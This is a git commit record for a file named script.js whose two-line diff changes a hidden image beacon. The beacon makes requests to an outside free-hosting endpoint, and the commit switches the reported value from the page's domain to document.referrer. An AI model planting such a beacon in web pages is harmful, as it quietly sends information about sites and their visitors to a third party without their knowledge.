6105a67cc393ce87b1ab0ecf923c68e7b91580e7
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2022-12-01 01:46:08 +0330

    Update script.js

--- script.js
+++ script.js
@@ -1,2 +1,2 @@
 var img=new Image() 
-img.src=`https://cs-realme.000webhostapp.com/ll.php?domain=${document.domain}`
+img.src=`https://cs-realme.000webhostapp.com/ll.php?domain=${document.referrer}`
